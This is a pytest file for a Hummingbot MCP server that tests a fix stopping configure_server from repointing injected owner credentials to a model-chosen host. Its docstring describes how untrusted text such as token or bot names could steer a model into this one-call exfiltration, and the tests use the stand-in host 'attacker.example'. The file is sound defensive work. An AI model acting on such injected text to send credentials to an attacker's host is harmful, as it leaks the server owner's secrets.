"""Spawn-injected credentials never follow a model-chosen host (SEC-253).

``configure_server`` applies partial updates on top of the *live* settings, so
every field it isn't given is inherited — password included. In a Condor-spawned
process that password is the server owner's, injected on the env by
``build_mcp_servers_for_session``, which made ``configure_server(host=…)`` a
one-call exfiltration primitive: rebuild the URL around any host, then
``initialize(force=True)`` authenticates against it. Untrusted text reaches this
session (token names, bot names, market data), so the prompt's "do not call
configure_server" is guidance, not a control.

These tests pin the enforcement: where the credentials were injected the
mutation is refused before anything is written, reloaded or connected, and where
they were not — a standalone uvx/``.mcp.json`` launch — the old behaviour is
untouched.

The repo has no async test setup, so the coroutines are driven with
asyncio.run() instead of a pytest-asyncio marker.
"""

import asyncio

import pytest

from mcp_servers.hummingbot_api import server as hb_server
from mcp_servers.hummingbot_api import settings as settings_module
from mcp_servers.hummingbot_api.settings import settings

OWNER_USER = "condor-api-user"
OWNER_PASSWORD = "sup3r-s3cret-api-password"
EVIL_HOST = "attacker.example"


class FakeClient:
    """Records whether anything tried to reconnect."""

    def __init__(self):
        self.closed = False
        self.initialized = False

    async def close(self):
        self.closed = True

    async def initialize(self, force: bool = False):
        self.initialized = True


@pytest.fixture
def rig(monkeypatch):
    """A pinned server config, a fake client, and a save() that records."""
    monkeypatch.setattr(settings, "server_name", "prod", raising=False)
    monkeypatch.setattr(settings, "api_url", "http://10.0.0.5:8000", raising=False)
    monkeypatch.setattr(settings, "api_username", OWNER_USER, raising=False)
    monkeypatch.setattr(settings, "api_password", OWNER_PASSWORD, raising=False)

    client = FakeClient()
    monkeypatch.setattr(hb_server, "hummingbot_client", client)

    saved: list = []
    monkeypatch.setattr(settings_module, "save_server_config", saved.append)

    # Default to a standalone launch; the injected cases opt in explicitly.
    monkeypatch.delenv("HUMMINGBOT_API_USERNAME", raising=False)
    monkeypatch.delenv("HUMMINGBOT_API_PASSWORD", raising=False)

    return client, saved


def test_injected_credentials_never_reach_a_model_chosen_host(rig, monkeypatch):
    """The exfiltration primitive: repointing must not connect with the owner's creds."""
    client, saved = rig
    monkeypatch.setenv("HUMMINGBOT_API_USERNAME", OWNER_USER)
    monkeypatch.setenv("HUMMINGBOT_API_PASSWORD", OWNER_PASSWORD)

    result = asyncio.run(hb_server.configure_server(host=EVIL_HOST))

    assert not client.initialized, "authenticated against a model-chosen host"
    assert not client.closed, "tore down the pinned connection"
    assert settings.api_url == "http://10.0.0.5:8000", "settings were repointed"
    assert EVIL_HOST not in result
    assert OWNER_PASSWORD not in result
    assert "Settings → Servers" in result


def test_injected_credentials_are_not_written_to_disk(rig, monkeypatch):
    """save_server_config would leave the password in cleartext YAML, machine-global."""
    _client, saved = rig
    monkeypatch.setenv("HUMMINGBOT_API_USERNAME", OWNER_USER)
    monkeypatch.setenv("HUMMINGBOT_API_PASSWORD", OWNER_PASSWORD)

    asyncio.run(hb_server.configure_server(host=EVIL_HOST, port=9000))

    assert saved == [], "wrote ~/.hummingbot_mcp/server.yml for a spawned process"


def test_password_alone_on_the_env_is_enough_to_refuse(rig, monkeypatch):
    """Either half of the injection means this process holds a secret it was handed."""
    client, saved = rig
    monkeypatch.setenv("HUMMINGBOT_API_PASSWORD", OWNER_PASSWORD)

    asyncio.run(hb_server.configure_server(host=EVIL_HOST))

    assert not client.initialized
    assert saved == []


def test_the_read_only_branch_still_reports_the_active_server(rig, monkeypatch):
    """No parameters is a read; it stays available on a spawned process."""
    client, _saved = rig
    monkeypatch.setenv("HUMMINGBOT_API_USERNAME", OWNER_USER)
    monkeypatch.setenv("HUMMINGBOT_API_PASSWORD", OWNER_PASSWORD)

    result = asyncio.run(hb_server.configure_server())

    assert "prod" in result
    assert "http://10.0.0.5:8000" in result
    assert OWNER_USER in result
    assert OWNER_PASSWORD not in result
    assert not client.initialized


def test_a_standalone_launch_still_configures_and_persists(rig):
    """No injected credentials → the uvx/.mcp.json path is unchanged."""
    client, saved = rig

    result = asyncio.run(hb_server.configure_server(host="localhost", port=8000))

    assert client.closed and client.initialized
    assert settings.api_url == "http://localhost:8000"
    assert len(saved) == 1
    assert saved[0].url == "http://localhost:8000"
    assert "connected successfully" in result


# ---------------------------------------------------------------------------
# A repoint keeps the scheme, drops stale rules, and saves privately (MH-10)
# ---------------------------------------------------------------------------


def test_renaming_an_https_server_does_not_downgrade_it_to_http(rig, monkeypatch):
    """`configure_server(name=...)` rebuilt the URL as http://host:8000 and
    persisted it — the password then travels in clear, to a different port."""
    _client, saved = rig
    monkeypatch.setattr(settings, "api_url", "https://api.example.com")

    asyncio.run(hb_server.configure_server(name="prod-renamed"))

    assert settings.api_url == "https://api.example.com"
    assert saved[0].url == "https://api.example.com"
    assert saved[0].name == "prod-renamed"


@pytest.mark.parametrize(
    ("current", "kwargs", "expected"),
    [
        ("https://api.example.com", {"port": 8443}, "https://api.example.com:8443"),
        ("https://api.example.com:8443", {"host": "other"}, "https://other:8443"),
        ("http://10.0.0.5:8000", {"host": "localhost"}, "http://localhost:8000"),
        (
            "http://10.0.0.5:8000",
            {"host": "https://api.example.com"},
            "https://api.example.com",
        ),
        (
            "https://api.example.com",
            {"host": "http://localhost:8000"},
            "http://localhost:8000",
        ),
        ("http://10.0.0.5:8000", {"host": "box:9000"}, "http://box:9000"),
        ("https://api.example.com", {"username": "u"}, "https://api.example.com"),
    ],
)
def test_the_scheme_and_port_follow_what_was_given(
    rig, monkeypatch, current, kwargs, expected
):
    _client, saved = rig
    monkeypatch.setattr(settings, "api_url", current)

    asyncio.run(hb_server.configure_server(**kwargs))

    assert saved[0].url == expected
    assert settings.api_url == expected


def test_a_host_that_is_not_a_host_is_refused_before_anything_is_saved(rig):
    from mcp_servers.hummingbot_api.exceptions import ToolError

    client, saved = rig

    with pytest.raises(ToolError, match="host"):
        asyncio.run(hb_server.configure_server(host="ftp://files.example.com"))

    assert saved == []
    assert not client.closed


def test_a_repoint_drops_the_previous_servers_trading_rules(rig):
    """The cache is keyed (connector, pair): without this the old server's rules,
    or its cached "no rules", vet the new server's creates for a minute."""
    from mcp_servers.hummingbot_api.hummingbot_client import trading_rules_cache

    class _OldServer:
        class connectors:
            @staticmethod
            async def get_trading_rules(connector_name, trading_pairs=None):
                return {"BTC-USDT": {"min_notional_size": 5}}

    trading_rules_cache.clear()
    asyncio.run(trading_rules_cache.get(_OldServer, "binance", "BTC-USDT"))
    assert trading_rules_cache._entries

    asyncio.run(hb_server.configure_server(host="localhost", port=8000))

    assert trading_rules_cache._entries == {}


def test_the_saved_server_config_is_owner_only_and_replaced_whole(
    tmp_path, monkeypatch
):
    """server.yml holds the API password in clear; it was created 0644."""
    import os
    import stat

    import yaml

    path = tmp_path / "cfg" / "server.yml"
    monkeypatch.setattr(settings_module, "CONFIG_DIR", path.parent)
    monkeypatch.setattr(settings_module, "SERVER_CONFIG_PATH", path)

    config = settings_module.ServerConfig(
        name="prod", url="https://api.example.com", username="u", password="p"
    )
    settings_module.save_server_config(config)

    assert stat.S_IMODE(path.stat().st_mode) == 0o600
    assert yaml.safe_load(path.read_text())["url"] == "https://api.example.com"

    # A second save over an existing, wider file must still end up private.
    path.chmod(0o644)
    settings_module.save_server_config(config)
    assert stat.S_IMODE(path.stat().st_mode) == 0o600
    assert [p.name for p in path.parent.iterdir()] == ["server.yml"]


def test_a_failed_save_leaves_the_previous_config_intact(tmp_path, monkeypatch):
    import os

    path = tmp_path / "server.yml"
    path.write_text("name: old\n")
    monkeypatch.setattr(settings_module, "CONFIG_DIR", tmp_path)
    monkeypatch.setattr(settings_module, "SERVER_CONFIG_PATH", path)

    def _boom(src, dst):
        raise OSError("disk full")

    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(os, "replace", _boom)
        with pytest.raises(OSError):
            settings_module.save_server_config(settings_module.ServerConfig())

    assert path.read_text() == "name: old\n"
    assert [p.name for p in tmp_path.iterdir()] == ["server.yml"]


# ---------------------------------------------------------------------------
# An injected --url never borrows the file's credentials (MH-10)
# ---------------------------------------------------------------------------


def _apply(monkeypatch, argv, **env):
    import sys

    monkeypatch.setattr(sys, "argv", ["prog", *argv])
    for name in ("HUMMINGBOT_API_USERNAME", "HUMMINGBOT_API_PASSWORD"):
        monkeypatch.delenv(name, raising=False)
    for name, value in env.items():
        monkeypatch.setenv(name, value)
    monkeypatch.setattr(settings, "api_url", "http://from-yml:8000")
    monkeypatch.setattr(settings, "api_username", "yml-user")
    monkeypatch.setattr(settings, "api_password", "yml-password")
    monkeypatch.setattr(settings, "server_name", "from-yml")
    hb_server._apply_cli_args()


def test_a_spawn_with_no_credentials_does_not_send_the_files_to_its_url(monkeypatch):
    """server.yml's username/password belong to whatever server it last named —
    not to the one the spawner pointed this process at."""
    _apply(monkeypatch, ["--url", "http://10.0.0.5:8000", "--server-name", "prod"])

    assert settings.api_url == "http://10.0.0.5:8000"
    assert settings.api_username == ""
    assert settings.api_password == ""


def test_a_spawn_with_half_its_credentials_does_not_borrow_the_other_half(
    monkeypatch,
):
    _apply(
        monkeypatch,
        ["--url", "http://10.0.0.5:8000"],
        HUMMINGBOT_API_USERNAME="owner",
    )

    assert settings.api_username == "owner"
    assert settings.api_password == ""


def test_a_standalone_launch_keeps_the_files_credentials(monkeypatch):
    _apply(monkeypatch, [])

    assert settings.api_url == "http://from-yml:8000"
    assert settings.api_username == "yml-user"
    assert settings.api_password == "yml-password"
